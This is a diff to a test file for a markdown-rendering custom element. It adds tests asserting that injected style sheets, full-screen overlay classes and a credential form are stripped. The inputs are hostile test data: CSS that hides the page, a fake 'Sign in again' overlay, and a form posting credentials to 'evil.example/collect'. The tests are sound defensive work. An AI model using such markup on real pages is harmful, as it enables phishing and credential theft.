@@ -50,6 +50,23 @@ describe('<lw-markdown> custom element', () => {
     expect(html).not.toContain('position:fixed');
   });
 
+  it('renders a style sheet anywhere in the text without it', () => {
+    const html = render(
+      'Hello\n\n<p>x</p><style>body{display:none}</style>\n\nHi <svg><style>body>*{display:none}</style></svg>',
+    );
+
+    expect(html).toContain('Hello');
+    expect(html).not.toContain('<style');
+    expect(html).not.toContain('display:none');
+  });
+
+  it('renders an overlay drawn with workbench classes without its classes', () => {
+    const html = render('<div class="fixed inset-0 z-50">Sign in again</div>');
+
+    expect(html).toContain('Sign in again');
+    expect(html).not.toContain('class=');
+  });
+
   it('renders a credential form without its form, fields or buttons', () => {
     const html = render(
       '<form action="https://evil.example/collect" method="post">' +
